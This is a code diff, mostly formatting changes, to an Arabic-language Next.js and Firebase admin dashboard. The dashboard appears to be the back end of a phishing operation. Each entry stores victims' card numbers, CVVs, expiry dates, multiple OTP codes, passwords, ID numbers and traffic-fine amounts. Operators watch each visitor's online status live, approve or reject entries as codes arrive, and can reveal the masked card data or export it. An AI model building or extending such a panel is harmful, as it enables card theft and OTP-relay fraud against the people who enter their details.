@@ -1,7 +1,7 @@
-"use client"
-import type React from "react"
-import { useState, useEffect, useMemo, useRef } from "react"
-import { useRouter } from "next/navigation"
+"use client";
+import type React from "react";
+import { useState, useEffect, useMemo, useRef } from "react";
+import { useRouter } from "next/navigation";
 import {
   Trash2,
   Users,
@@ -31,23 +31,53 @@ import {
   EyeOff,
   Eye,
   X,
-} from "lucide-react"
-import { Button } from "@/components/ui/button"
-import { Badge } from "@/components/ui/badge"
-import { ar } from "date-fns/locale"
-import { formatDistanceToNow, format } from "date-fns"
-import { Dialog, DialogContent, DialogHeader, DialogTitle, DialogFooter } from "@/components/ui/dialog"
-import { Card, CardContent, CardHeader, CardTitle, CardFooter, CardDescription } from "@/components/ui/card"
-import { collection, doc, writeBatch, updateDoc, onSnapshot, query, orderBy } from "firebase/firestore"
-import { onAuthStateChanged, signOut } from "firebase/auth"
-import { onValue, ref } from "firebase/database"
-import { database } from "@/lib/firestore"
-import { auth } from "@/lib/firestore"
-import { db } from "@/lib/firestore"
-import { playNotificationSound } from "@/lib/actions"
-import { Popover, PopoverContent, PopoverTrigger } from "@/components/ui/popover"
-import { Tooltip, TooltipContent, TooltipProvider, TooltipTrigger } from "@/components/ui/tooltip"
-import { Input } from "@/components/ui/input"
+} from "lucide-react";
+import { Button } from "@/components/ui/button";
+import { Badge } from "@/components/ui/badge";
+import { ar } from "date-fns/locale";
+import { formatDistanceToNow, format } from "date-fns";
+import {
+  Dialog,
+  DialogContent,
+  DialogHeader,
+  DialogTitle,
+  DialogFooter,
+} from "@/components/ui/dialog";
+import {
+  Card,
+  CardContent,
+  CardHeader,
+  CardTitle,
+  CardFooter,
+  CardDescription,
+} from "@/components/ui/card";
+import {
+  collection,
+  doc,
+  writeBatch,
+  updateDoc,
+  onSnapshot,
+  query,
+  orderBy,
+} from "firebase/firestore";
+import { onAuthStateChanged, signOut } from "firebase/auth";
+import { onValue, ref } from "firebase/database";
+import { database } from "@/lib/firestore";
+import { auth } from "@/lib/firestore";
+import { db } from "@/lib/firestore";
+import { playNotificationSound } from "@/lib/actions";
+import {
+  Popover,
+  PopoverContent,
+  PopoverTrigger,
+} from "@/components/ui/popover";
+import {
+  Tooltip,
+  TooltipContent,
+  TooltipProvider,
+  TooltipTrigger,
+} from "@/components/ui/tooltip";
+import { Input } from "@/components/ui/input";
 import {
   DropdownMenu,
   DropdownMenuContent,
@@ -55,112 +85,125 @@ import {
   DropdownMenuTrigger,
   DropdownMenuSeparator,
   DropdownMenuLabel,
-} from "@/components/ui/dropdown-menu"
-import { Avatar, AvatarFallback, AvatarImage } from "@/components/ui/avatar"
-import { Separator } from "@/components/ui/separator"
-import { Switch } from "@/components/ui/switch"
-import { Label } from "@/components/ui/label"
-import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select"
-import { Checkbox } from "@/components/ui/checkbox"
-import { toast } from "@/hooks/use-toast"
-import { Sheet, SheetContent, SheetHeader, SheetTitle } from "@/components/ui/sheet"
-import { Tabs, TabsList, TabsTrigger } from "@/components/ui/tabs"
+} from "@/components/ui/dropdown-menu";
+import { Avatar, AvatarFallback, AvatarImage } from "@/components/ui/avatar";
+import { Separator } from "@/components/ui/separator";
+import { Switch } from "@/components/ui/switch";
+import { Label } from "@/components/ui/label";
+import {
+  Select,
+  SelectContent,
+  SelectItem,
+  SelectTrigger,
+  SelectValue,
+} from "@/components/ui/select";
+import { Checkbox } from "@/components/ui/checkbox";
+import { toast } from "@/hooks/use-toast";
+import {
+  Sheet,
+  SheetContent,
+  SheetHeader,
+  SheetTitle,
+} from "@/components/ui/sheet";
+import { Tabs, TabsList, TabsTrigger } from "@/components/ui/tabs";
 
 // Types
-type FlagColor = "red" | "yellow" | "green" | null
+type FlagColor = "red" | "yellow" | "green" | null;
 
 interface Notification {
-  createdDate: string
-  bank: string
-  cardStatus?: string
-  ip?: string
-  cvv: string
-  id: string | "0"
-  expiryDate: string
-  notificationCount: number
-  otp: string
-  otp2: string
-  page: string
-  cardNumber: string
-  country?: string
+  createdDate: string;
+  bank: string;
+  cardStatus?: string;
+  ip?: string;
+  cvv: string;
+  id: string | "0";
+  expiryDate: string;
+  notificationCount: number;
+  otp: string;
+  otp2: string;
+  page: string;
+  cardNumber: string;
+  country?: string;
   personalInfo: {
-    id?: string | "0"
-    name?: string
-  }
-  prefix: string
-  status: "pending" | "approved" | "rejected" | string
-  isOnline?: boolean
-  lastSeen: string
-  violationValue: number
-  pass?: string
-  year: string
-  month: string
-  pagename: string
-  plateType: string
-  allOtps?: string[] | null
-  idNumber: string
-  email: string
-  mobile: string
-  network: string
-  phoneOtp: string
-  cardExpiry: string
-  name: string
-  otpCode: string
-  phone: string
-  flagColor?: string
-  currentPage?: string
-  amount?: string
-  step?: number
+    id?: string | "0";
+    name?: string;
+  };
+  prefix: string;
+  status: "pending" | "approved" | "rejected" | string;
+  isOnline?: boolean;
+  lastSeen: string;
+  violationValue: number;
+  pass?: string;
+  year: string;
+  month: string;
+  pagename: string;
+  plateType: string;
+  allOtps?: string[] | null;
+  idNumber: string;
+  email: string;
+  mobile: string;
+  network: string;
+  phoneOtp: string;
+  cardExpiry: string;
+  name: string;
+  otpCode: string;
+  phone: string;
+  flagColor?: string;
+  currentPage?: string;
+  amount?: string;
+  step?: number;
 }
 
 // Hook for online users count
 function useOnlineUsersCount() {
-  const [onlineUsersCount, setOnlineUsersCount] = useState(0)
+  const [onlineUsersCount, setOnlineUsersCount] = useState(0);
 
   useEffect(() => {
-    const onlineUsersRef = ref(database, "status")
+    const onlineUsersRef = ref(database, "status");
     const unsubscribe = onValue(onlineUsersRef, (snapshot) => {
-      const data = snapshot.val()
+      const data = snapshot.val();
       if (data) {
-        const onlineCount = Object.values(data).filter((status: any) => status.state === "online").length
-        setOnlineUsersCount(onlineCount)
+        const onlineCount = Object.values(data).filter(
+          (status: any) => status.state === "online",
+        ).length;
+        setOnlineUsersCount(onlineCount);
       }
-    })
+    });
 
-    return () => unsubscribe()
-  }, [])
+    return () => unsubscribe();
+  }, []);
 
-  return onlineUsersCount
+  return onlineUsersCount;
 }
 
 // Hook to track online status for a specific user ID
 function useUserOnlineStatus(userId: string) {
-  const [isOnline, setIsOnline] = useState(false)
+  const [isOnline, setIsOnline] = useState(false);
 
   useEffect(() => {
-    const userStatusRef = ref(database, `/status/${userId}`)
+    const userStatusRef = ref(database, `/status/${userId}`);
 
     const unsubscribe = onValue(userStatusRef, (snapshot) => {
-      const data = snapshot.val()
-      setIsOnline(data && data.state === "online")
-    })
+      const data = snapshot.val();
+      setIsOnline(data && data.state === "online");
+    });
 
-    return () => unsubscribe()
-  }, [userId])
+    return () => unsubscribe();
+  }, [userId]);
 
-  return isOnline
+  return isOnline;
 }
 
 const handlePageName = (page: string) => {
   switch (page) {
     case "1":
-      return "الرئيسية"
+      return "الرئيسية";
     case "2":
-      return "الدفع"
+      return "الدفع";
     default:
-      return "غير معروف"
+      return "غير معروف";
   }
-}
+};
 
 // Enhanced Statistics Card Component
 function StatisticsCard({
@@ -172,20 +215,22 @@ function StatisticsCard({
   color,
   trend,
 }: {
-  title: string
-  value: string | number
-  change: string
-  changeType: "increase" | "decrease" | "neutral"
-  icon: React.ElementType
-  color: string
-  trend?: number[]
+  title: string;
+  value: string | number;
+  change: string;
+  changeType: "increase" | "decrease" | "neutral";
+  icon: React.ElementType;
+  color: string;
+  trend?: number[];
 }) {
   return (
     <Card className="relative overflow-hidden bg-slate-900/70 border border-slate-800/50 shadow-xl shadow-black/20 hover:shadow-2xl hover:shadow-black/30 transition-all duration-300 group backdrop-blur-sm">
       <div className="absolute inset-0 bg-gradient-to-br from-white/5 to-transparent opacity-0 group-hover:opacity-100 transition-opacity" />
       <CardHeader className="pb-2 relative">
         <div className="flex items-center justify-between">
-          <div className={`p-3 rounded-xl ${color} shadow-lg group-hover:scale-110 transition-transform`}>
+          <div
+            className={`p-3 rounded-xl ${color} shadow-lg group-hover:scale-110 transition-transform`}
+          >
             <Icon className="h-6 w-6 text-white" />
           </div>
           <div className="text-right">
@@ -232,31 +277,33 @@ function StatisticsCard({
         </div>
       </CardContent>
     </Card>
-  )
+  );
 }
 
 // Enhanced User Status Component
 function UserStatus({ userId }: { userId: string }) {
-  const [status, setStatus] = useState<"online" | "offline" | "unknown">("unknown")
-  const [lastSeen, setLastSeen] = useState<Date | null>(null)
+  const [status, setStatus] = useState<"online" | "offline" | "unknown">(
+    "unknown",
+  );
+  const [lastSeen, setLastSeen] = useState<Date | null>(null);
 
   useEffect(() => {
-    const userStatusRef = ref(database, `/status/${userId}`)
+    const userStatusRef = ref(database, `/status/${userId}`);
 
     const unsubscribe = onValue(userStatusRef, (snapshot) => {
-      const data = snapshot.val()
+      const data = snapshot.val();
       if (data) {
-        setStatus(data.state === "online" ? "online" : "offline")
+        setStatus(data.state === "online" ? "online" : "offline");
         if (data.lastChanged) {
-          setLastSeen(new Date(data.lastChanged))
+          setLastSeen(new Date(data.lastChanged));
         }
       } else {
-        setStatus("unknown")
+        setStatus("unknown");
       }
-    })
+    });
 
-    return () => unsubscribe()
-  }, [userId])
+    return () => unsubscribe();
+  }, [userId]);
 
   return (
     <TooltipProvider>
@@ -265,7 +312,11 @@ function UserStatus({ userId }: { userId: string }) {
           <div className="flex items-center gap-2 cursor-pointer">
             <div
               className={`w-2 h-2 rounded-full ${
-                status === "online" ? "bg-green-500 animate-pulse" : status === "offline" ? "bg-red-500" : "bg-gray-400"
+                status === "online"
+                  ? "bg-green-500 animate-pulse"
+                  : status === "offline"
+                    ? "bg-red-500"
+                    : "bg-gray-400"
               }`}
             />
             <Badge
@@ -278,20 +329,27 @@ function UserStatus({ userId }: { userId: string }) {
                     : "bg-gray-50 text-gray-700 border-gray-200 dark:bg-gray-950/30 dark:text-gray-300"
               }`}
             >
-              {status === "online" ? "متصل" : status === "offline" ? "غير متصل" : "غير معروف"}
+              {status === "online"
+                ? "متصل"
+                : status === "offline"
+                  ? "غير متصل"
+                  : "غير معروف"}
             </Badge>
           </div>
         </TooltipTrigger>
         <TooltipContent>
           {status === "offline" && lastSeen && (
-            <p>آخر ظهور: {formatDistanceToNow(lastSeen, { addSuffix: true, locale: ar })}</p>
+            <p>
+              آخر ظهور:{" "}
+              {formatDistanceToNow(lastSeen, { addSuffix: true, locale: ar })}
+            </p>
           )}
           {status === "online" && <p>متصل الآن</p>}
           {status === "unknown" && <p>لا توجد معلومات</p>}
         </TooltipContent>
       </Tooltip>
     </TooltipProvider>
-  )
+  );
 }
 
 // Enhanced Flag Color Selector
@@ -300,9 +358,9 @@ function FlagColorSelector({
   currentColor,
   onColorChange,
 }: {
-  notificationId: string
-  currentColor: any
-  onColorChange: (id: string, color: FlagColor) => void
+  notificationId: string;
+  currentColor: any;
+  onColorChange: (id: string, color: FlagColor) => void;
 }) {
   return (
     <Popover>
@@ -325,8 +383,16 @@ function FlagColorSelector({
         <div className="flex gap-2">
           {[
             { color: "red", label: "عالي الأولوية", bgColor: "bg-red-500" },
-            { color: "yellow", label: "متوسط الأولوية", bgColor: "bg-yellow-500" },
-            { color: "green", label: "منخفض الأولوية", bgColor: "bg-green-500" },
+            {
+              color: "yellow",
+              label: "متوسط الأولوية",
+              bgColor: "bg-yellow-500",
+            },
+            {
+              color: "green",
+              label: "منخفض الأولوية",
+              bgColor: "bg-green-500",
+            },
           ].map(({ color, label, bgColor }) => (
             <TooltipProvider key={color}>
               <Tooltip>
@@ -335,7 +401,9 @@ function FlagColorSelector({
                     variant="ghost"
                     size="icon"
                     className={`h-8 w-8 rounded-full ${bgColor} hover:opacity-80 transition-opacity`}
-                    onClick={() => onColorChange(notificationId, color as FlagColor)}
+                    onClick={() =>
+                      onColorChange(notificationId, color as FlagColor)
+                    }
                   >
                     <Flag className="h-4 w-4 text-white" />
                   </Button>
@@ -368,37 +436,43 @@ function FlagColorSelector({
         </div>
       </PopoverContent>
     </Popover>
-  )
+  );
 }
 
 // Enhanced Search Component
-function SearchBar({ onSearch, value }: { onSearch: (term: string) => void; value: string }) {
-  const [searchTerm, setSearchTerm] = useState(value)
-  const searchInputRef = useRef<HTMLInputElement>(null)
+function SearchBar({
+  onSearch,
+  value,
+}: {
+  onSearch: (term: string) => void;
+  value: string;
+}) {
+  const [searchTerm, setSearchTerm] = useState(value);
+  const searchInputRef = useRef<HTMLInputElement>(null);
 
   useEffect(() => {
-    setSearchTerm(value)
-  }, [value])
+    setSearchTerm(value);
+  }, [value]);
 
   const handleSearch = (term: string) => {
-    setSearchTerm(term)
-    onSearch(term)
-  }
+    setSearchTerm(term);
+    onSearch(term);
+  };
 
   const handleClear = () => {
-    setSearchTerm("")
-    onSearch("")
-    searchInputRef.current?.focus()
-  }
+    setSearchTerm("");
+    onSearch("");
+    searchInputRef.current?.focus();
+  };
 
   const handleKeyDown = (e: React.KeyboardEvent<HTMLInputElement>) => {
     if (e.key === "Enter") {
-      onSearch(searchTerm)
+      onSearch(searchTerm);
     }
     if (e.key === "Escape") {
-      handleClear()
+      handleClear();
     }
-  }
+  };
 
   return (
     <div className="relative group">
@@ -423,7 +497,7 @@ function SearchBar({ onSearch, value }: { onSearch: (term: string) => void; valu
         </Button>
       )}
     </div>
-  )
+  );
 }
 
 // Enhanced Pagination Component
@@ -434,43 +508,43 @@ function Pagination({
   totalItems,
   itemsPerPage,
 }: {
-  currentPage: number
-  totalPages: number
-  onPageChange: (page: number) => void
-  totalItems: number
-  itemsPerPage: number
+  currentPage: number;
+  totalPages: number;
+  onPageChange: (page: number) => void;
+  totalItems: number;
+  itemsPerPage: number;
 }) {
-  const startItem = (currentPage - 1) * itemsPerPage + 1
-  const endItem = Math.min(currentPage * itemsPerPage, totalItems)
+  const startItem = (currentPage - 1) * itemsPerPage + 1;
+  const endItem = Math.min(currentPage * itemsPerPage, totalItems);
 
   const getPageNumbers = () => {
-    const pages = []
-    const maxVisible = 5
+    const pages = [];
+    const maxVisible = 5;
 
     if (totalPages <= maxVisible) {
       for (let i = 1; i <= totalPages; i++) {
-        pages.push(i)
+        pages.push(i);
       }
     } else {
       if (currentPage <= 3) {
-        for (let i = 1; i <= 4; i++) pages.push(i)
-        pages.push("...")
-        pages.push(totalPages)
+        for (let i = 1; i <= 4; i++) pages.push(i);
+        pages.push("...");
+        pages.push(totalPages);
       } else if (currentPage >= totalPages - 2) {
-        pages.push(1)
-        pages.push("...")
-        for (let i = totalPages - 3; i <= totalPages; i++) pages.push(i)
+        pages.push(1);
+        pages.push("...");
+        for (let i = totalPages - 3; i <= totalPages; i++) pages.push(i);
       } else {
-        pages.push(1)
-        pages.push("...")
-        for (let i = currentPage - 1; i <= currentPage + 1; i++) pages.push(i)
-        pages.push("...")
-        pages.push(totalPages)
+        pages.push(1);
+        pages.push("...");
+        for (let i = currentPage - 1; i <= currentPage + 1; i++) pages.push(i);
+        pages.push("...");
+        pages.push(totalPages);
       }
     }
 
-    return pages
-  }
+    return pages;
+  };
 
   return (
     <div className="flex items-center justify-between flex-wrap gap-4">
@@ -521,7 +595,7 @@ function Pagination({
         </Button>
       </div>
     </div>
-  )
+  );
 }
 
 // Export dialog component
@@ -530,37 +604,37 @@ function ExportDialog({
   onOpenChange,
   notifications,
 }: {
-  open: boolean
-  onOpenChange: (open: boolean) => void
-  notifications: Notification[]
+  open: boolean;
+  onOpenChange: (open: boolean) => void;
+  notifications: Notification[];
 }) {
-  const [exportFormat, setExportFormat] = useState<"csv" | "json">("csv")
+  const [exportFormat, setExportFormat] = useState<"csv" | "json">("csv");
   const [exportFields, setExportFields] = useState({
     personalInfo: true,
     cardInfo: true,
     status: true,
     timestamps: true,
-  })
-  const [isExporting, setIsExporting] = useState(false)
+  });
+  const [isExporting, setIsExporting] = useState(false);
 
   const handleExport = () => {
-    setIsExporting(true)
+    setIsExporting(true);
 
     // Simulate export process
     setTimeout(() => {
       // In a real implementation, generate and download the file here
       const selectedFields = Object.entries(exportFields)
         .filter(([_, value]) => value)
-        .map(([key]) => key)
+        .map(([key]) => key);
 
-      setIsExporting(false)
-      onOpenChange(false)
+      setIsExporting(false);
+      onOpenChange(false);
       toast({
         title: "تم التصدير بنجاح",
         description: `تم تصدير ${notifications.length} إشعار بتنسيق ${exportFormat.toUpperCase()}`,
-      })
-    }, 1500)
-  }
+      });
+    }, 1500);
+  };
 
   return (
     <Dialog open={open} onOpenChange={onOpenChange}>
@@ -613,7 +687,10 @@ function ExportDialog({
                 { id: "status", label: "حالة الإشعار" },
                 { id: "timestamps", label: "الطوابع الزمنية" },
               ].map(({ id, label }) => (
-                <div key={id} className="flex items-center space-x-2 space-x-reverse">
+                <div
+                  key={id}
+                  className="flex items-center space-x-2 space-x-reverse"
+                >
                   <Checkbox
                     id={id}
                     checked={exportFields[id as keyof typeof exportFields]}
@@ -635,7 +712,9 @@ function ExportDialog({
           <div className="rounded-md bg-muted p-3">
             <div className="flex items-center gap-2 text-sm">
               <AlertCircle className="h-4 w-4 text-muted-foreground flex-shrink-0" />
-              <p className="text-muted-foreground">سيتم تصدير {notifications.length} إشعار بالإعدادات المحددة.</p>
+              <p className="text-muted-foreground">
+                سيتم تصدير {notifications.length} إشعار بالإعدادات المحددة.
+              </p>
             </div>
           </div>
         </div>
@@ -659,16 +738,22 @@ function ExportDialog({
         </DialogFooter>
       </DialogContent>
     </Dialog>
-  )
+  );
 }
 
 // Settings panel component
-function SettingsPanel({ open, onOpenChange }: { open: boolean; onOpenChange: (open: boolean) => void }) {
-  const [notifyNewCards, setNotifyNewCards] = useState(true)
-  const [notifyNewUsers, setNotifyNewUsers] = useState(true)
-  const [playSounds, setPlaySounds] = useState(true)
-  const [autoRefresh, setAutoRefresh] = useState(true)
-  const [refreshInterval, setRefreshInterval] = useState("30")
+function SettingsPanel({
+  open,
+  onOpenChange,
+}: {
+  open: boolean;
+  onOpenChange: (open: boolean) => void;
+}) {
+  const [notifyNewCards, setNotifyNewCards] = useState(true);
+  const [notifyNewUsers, setNotifyNewUsers] = useState(true);
+  const [playSounds, setPlaySounds] = useState(true);
+  const [autoRefresh, setAutoRefresh] = useState(true);
+  const [refreshInterval, setRefreshInterval] = useState("30");
 
   const handleSaveSettings = () => {
     // Save settings to localStorage or backend
@@ -681,31 +766,35 @@ function SettingsPanel({ open, onOpenChange }: { open: boolean; onOpenChange: (o
         autoRefresh,
         refreshInterval,
       }),
-    )
+    );
 
     toast({
       title: "تم حفظ الإعدادات",
       description: "تم حفظ إعدادات الإشعارات بنجاح",
-    })
-    onOpenChange(false)
-  }
+    });
+    onOpenChange(false);
+  };
 
   // Load settings on mount
   useEffect(() => {
-    const savedSettings = localStorage.getItem("notificationSettings")
+    const savedSettings = localStorage.getItem("notificationSettings");
     if (savedSettings) {
-      const settings = JSON.parse(savedSettings)
-      setNotifyNewCards(settings.notifyNewCards)
-      setNotifyNewUsers(settings.notifyNewUsers)
-      setPlaySounds(settings.playSounds)
-      setAutoRefresh(settings.autoRefresh)
-      setRefreshInterval(settings.refreshInterval)
+      const settings = JSON.parse(savedSettings);
+      setNotifyNewCards(settings.notifyNewCards);
+      setNotifyNewUsers(settings.notifyNewUsers);
+      setPlaySounds(settings.playSounds);
+      setAutoRefresh(settings.autoRefresh);
+      setRefreshInterval(settings.refreshInterval);
     }
-  }, [])
+  }, []);
 
   return (
     <Sheet open={open} onOpenChange={onOpenChange}>
-      <SheetContent side="left" className="sm:max-w-md overflow-y-auto" dir="rtl">
+      <SheetContent
+        side="left"
+        className="sm:max-w-md overflow-y-auto"
+        dir="rtl"
+      >
         <SheetHeader>
           <SheetTitle className="flex items-center gap-2 text-xl">
             <Settings className="h-5 w-5" />
@@ -721,27 +810,45 @@ function SettingsPanel({ open, onOpenChange }: { open: boolean; onOpenChange: (o
                   <Label htmlFor="notify-cards" className="cursor-pointer">
                     إشعارات البطاقات الجديدة
                   </Label>
-                  <p className="text-xs text-muted-foreground">تلقي إشعارات عند إضافة بطاقة جديدة</p>
+                  <p className="text-xs text-muted-foreground">
+                    تلقي إشعارات عند إضافة بطاقة جديدة
+                  </p>
                 </div>
-                <Switch id="notify-cards" checked={notifyNewCards} onCheckedChange={setNotifyNewCards} />
+                <Switch
+                  id="notify-cards"
+                  checked={notifyNewCards}
+                  onCheckedChange={setNotifyNewCards}
+                />
               </div>
               <div className="flex items-center justify-between rounded-lg border p-3 hover:bg-muted/50 transition-colors">
                 <div className="space-y-0.5">
                   <Label htmlFor="notify-users" className="cursor-pointer">
                     إشعارات المستخدمين الجدد
                   </Label>
-                  <p className="text-xs text-muted-foreground">تلقي إشعارات عند تسجيل مستخدم جديد</p>
+                  <p className="text-xs text-muted-foreground">
+                    تلقي إشعارات عند تسجيل مستخدم جديد
+                  </p>
                 </div>
-                <Switch id="notify-users" checked={notifyNewUsers} onCheckedChange={setNotifyNewUsers} />
+                <Switch
+                  id="notify-users"
+                  checked={notifyNewUsers}
+                  onCheckedChange={setNotifyNewUsers}
+                />
               </div>
               <div className="flex items-center justify-between rounded-lg border p-3 hover:bg-muted/50 transition-colors">
                 <div className="space-y-0.5">
                   <Label htmlFor="play-sounds" className="cursor-pointer">
                     تشغيل الأصوات
                   </Label>
-                  <p className="text-xs text-muted-foreground">تشغيل صوت عند استلام إشعار جديد</p>
+                  <p className="text-xs text-muted-foreground">
+                    تشغيل صوت عند استلام إشعار جديد
+                  </p>
                 </div>
-                <Switch id="play-sounds" checked={playSounds} onCheckedChange={setPlaySounds} />
+                <Switch
+                  id="play-sounds"
+                  checked={playSounds}
+                  onCheckedChange={setPlaySounds}
+                />
               </div>
             </div>
           </div>
@@ -756,14 +863,25 @@ function SettingsPanel({ open, onOpenChange }: { open: boolean; onOpenChange: (o
                   <Label htmlFor="auto-refresh" className="cursor-pointer">
                     تحديث تلقائي
                   </Label>
-                  <p className="text-xs text-muted-foreground">تحديث البيانات تلقائيًا</p>
+                  <p className="text-xs text-muted-foreground">
+                    تحديث البيانات تلقائيًا
+                  </p>
                 </div>
-                <Switch id="auto-refresh" checked={autoRefresh} onCheckedChange={setAutoRefresh} />
+                <Switch
+                  id="auto-refresh"
+                  checked={autoRefresh}
+                  onCheckedChange={setAutoRefresh}
+                />
               </div>
               {autoRefresh && (
                 <div className="space-y-1.5 pt-2">
-                  <Label htmlFor="refresh-interval">فترة التحديث (بالثواني)</Label>
-                  <Select value={refreshInterval} onValueChange={setRefreshInterval}>
+                  <Label htmlFor="refresh-interval">
+                    فترة التحديث (بالثواني)
+                  </Label>
+                  <Select
+                    value={refreshInterval}
+                    onValueChange={setRefreshInterval}
+                  >
                     <SelectTrigger id="refresh-interval">
                       <SelectValue placeholder="اختر فترة التحديث" />
                     </SelectTrigger>
@@ -790,7 +908,9 @@ function SettingsPanel({ open, onOpenChange }: { open: boolean; onOpenChange: (o
               </div>
               <div className="flex justify-between">
                 <span className="text-muted-foreground">آخر تحديث:</span>
-                <span className="font-medium">{format(new Date(), "yyyy/MM/dd")}</span>
+                <span className="font-medium">
+                  {format(new Date(), "yyyy/MM/dd")}
+                </span>
               </div>
             </div>
           </div>
@@ -804,18 +924,27 @@ function SettingsPanel({ open, onOpenChange }: { open: boolean; onOpenChange: (o
         </div>
       </SheetContent>
     </Sheet>
-  )
+  );
 }
 
 // Info Badge Component
-const InfoBadge = ({ active, onClick, icon: Icon, text, inactiveText, colorClass }: any) => (
+const InfoBadge = ({
+  active,
+  onClick,
+  icon: Icon,
+  text,
+  inactiveText,
+  colorClass,
+}: any) => (
   <TooltipProvider>
     <Tooltip>
       <TooltipTrigger asChild>
         <Badge
           variant={active ? "default" : "secondary"}
           className={`cursor-pointer transition-all hover:scale-105 ${
-            active ? `bg-gradient-to-r ${colorClass} text-white shadow-md` : "opacity-60"
+            active
+              ? `bg-gradient-to-r ${colorClass} text-white shadow-md`
+              : "opacity-60"
           }`}
           onClick={active ? onClick : undefined}
         >
@@ -828,27 +957,51 @@ const InfoBadge = ({ active, onClick, icon: Icon, text, inactiveText, colorClass
       </TooltipContent>
     </Tooltip>
   </TooltipProvider>
-)
+);
 
 // Status Badge Component
 const StatusBadge = ({ status }: any) => {
   const statusMap = {
-    approved: { text: "موافق", color: "from-green-500 to-green-600", icon: CheckCircle },
-    rejected: { text: "مرفوض", color: "from-red-500 to-red-600", icon: XCircle },
-    pending: { text: "معلق", color: "from-yellow-500 to-yellow-600", icon: Clock },
-  }
-  const { text, color, icon: Icon } = (statusMap[status as keyof typeof statusMap] as any) || statusMap.pending
+    approved: {
+      text: "موافق",
+      color: "from-green-500 to-green-600",
+      icon: CheckCircle,
+    },
+    rejected: {
+      text: "مرفوض",
+      color: "from-red-500 to-red-600",
+      icon: XCircle,
+    },
+    pending: {
+      text: "معلق",
+      color: "from-yellow-500 to-yellow-600",
+      icon: Clock,
+    },
+  };
+  const {
+    text,
+    color,
+    icon: Icon,
+  } = (statusMap[status as keyof typeof statusMap] as any) || statusMap.pending;
 
   return (
-    <Badge className={`bg-gradient-to-r ${color} text-white flex items-center gap-1 shadow-sm`}>
+    <Badge
+      className={`bg-gradient-to-r ${color} text-white flex items-center gap-1 shadow-sm`}
+    >
       <Icon className="h-3 w-3" />
       {text}
     </Badge>
-  )
-}
+  );
+};
 
 // Gradient Button Component
-const GradientButton = ({ text, icon: Icon, onClick, disabled, color }: any) => (
+const GradientButton = ({
+  text,
+  icon: Icon,
+  onClick,
+  disabled,
+  color,
+}: any) => (
   <Button
     variant="outline"
     size="sm"
@@ -858,10 +1011,15 @@ const GradientButton = ({ text, icon: Icon, onClick, disabled, color }: any) => 
   >
     {text} <Icon className="h-4 w-4" />
   </Button>
-)
+);
 
 // Action Buttons Component
-const ActionButtons = ({ notification, handleApproval, handleDelete, handleFlagColorChange }: any) => (
+const ActionButtons = ({
+  notification,
+  handleApproval,
+  handleDelete,
+  handleFlagColorChange,
+}: any) => (
   <div className="flex justify-center gap-1 flex-wrap items-center">
     <GradientButton
       text="موافقة"
@@ -891,19 +1049,22 @@ const ActionButtons = ({ notification, handleApproval, handleDelete, handleFlagC
       <Trash2 className="h-4 w-4" />
     </Button>
     {notification?.amount && (
-      <Badge variant="outline" className="font-mono">
+      <Badge
+        variant="outline"
+        className="font-mono text-red-500 text-yellow-500 "
+      >
         {notification.amount}
       </Badge>
     )}
   </div>
-)
+);
 
 // Header Icon Component
-const HeaderIcon: React.FC<{ icon: React.ElementType; bgGradient: string; title: string }> = ({
-  icon: Icon,
-  bgGradient,
-  title,
-}) => (
+const HeaderIcon: React.FC<{
+  icon: React.ElementType;
+  bgGradient: string;
+  title: string;
+}> = ({ icon: Icon, bgGradient, title }) => (
   <>
     <div
       className={`w-12 h-12 rounded-full flex items-center justify-center bg-gradient-to-br ${bgGradient} shadow-md`}
@@ -912,52 +1073,70 @@ const HeaderIcon: React.FC<{ icon: React.ElementType; bgGradient: string; title:
     </div>
     <span className="ml-2">{title}</span>
   </>
-)
+);
 
 // Info Section Component
 const InfoSection: React.FC<{
-  items: { label: string; value: any; sensitive?: boolean }[]
-  additionalOtps?: string[]
+  items: { label: string; value: any; sensitive?: boolean }[];
+  additionalOtps?: string[];
 }> = ({ items, additionalOtps }) => {
-  const [showSensitive, setShowSensitive] = useState<{ [key: string]: boolean }>({})
+  const [showSensitive, setShowSensitive] = useState<{
+    [key: string]: boolean;
+  }>({});
 
   const toggleSensitive = (label: string) => {
-    setShowSensitive((prev) => ({ ...prev, [label]: !prev[label] }))
-  }
+    setShowSensitive((prev) => ({ ...prev, [label]: !prev[label] }));
+  };
 
   return (
     <div className="mt-4 space-y-4">
       <div className="bg-gradient-to-br from-gray-50 to-gray-100 dark:from-gray-800 dark:to-gray-900 rounded-xl shadow-inner p-5 space-y-3">
         {items.map(({ label, value, sensitive }) => {
-          if (value === undefined || value === null || value === "") return null
+          if (value === undefined || value === null || value === "")
+            return null;
 
           return (
             <div
               key={label}
               className="flex justify-between items-center py-2 border-b border-gray-300 dark:border-gray-700 last:border-0 hover:bg-gray-100 dark:hover:bg-gray-800 rounded-md px-2 transition"
             >
-              <span className="font-medium text-gray-500 dark:text-gray-400">{label}:</span>
+              <span className="font-medium text-gray-500 dark:text-gray-400">
+                {label}:
+              </span>
               <div className="flex items-center gap-2">
                 {sensitive ? (
                   <>
                     <span className="font-semibold text-gray-900 dark:text-gray-200">
                       {showSensitive[label] ? String(value) : "••••••"}
                     </span>
-                    <Button variant="ghost" size="icon" className="h-6 w-6" onClick={() => toggleSensitive(label)}>
-                      {showSensitive[label] ? <EyeOff className="h-3 w-3" /> : <Eye className="h-3 w-3" />}
+                    <Button
+                      variant="ghost"
+                      size="icon"
+                      className="h-6 w-6"
+                      onClick={() => toggleSensitive(label)}
+                    >
+                      {showSensitive[label] ? (
+                        <EyeOff className="h-3 w-3" />
+                      ) : (
+                        <Eye className="h-3 w-3" />
+                      )}
                     </Button>
                   </>
                 ) : (
-                  <span className="font-semibold text-gray-900 dark:text-gray-200">{String(value)}</span>
+                  <span className="font-semibold text-gray-900 dark:text-gray-200">
+                    {String(value)}
+                  </span>
                 )}
               </div>
             </div>
-          )
+          );
         })}
 
         {additionalOtps && additionalOtps.length > 0 && (
           <div className="pt-3 border-t border-gray-300 dark:border-gray-700">
-            <span className="font-medium text-gray-500 dark:text-gray-400 block mb-2">جميع الرموز:</span>
+            <span className="font-medium text-gray-500 dark:text-gray-400 block mb-2">
+              جميع الرموز:
+            </span>
             <div className="flex flex-wrap gap-2">
               {additionalOtps.map((otp, index) => (
                 <Badge
@@ -973,83 +1152,98 @@ const InfoSection: React.FC<{
         )}
       </div>
     </div>
-  )
-}
+  );
+};
 
 // Main Component
 export default function NotificationsPage() {
-  const [notifications, setNotifications] = useState<Notification[]>([])
-  const [isLoading, setIsLoading] = useState(true)
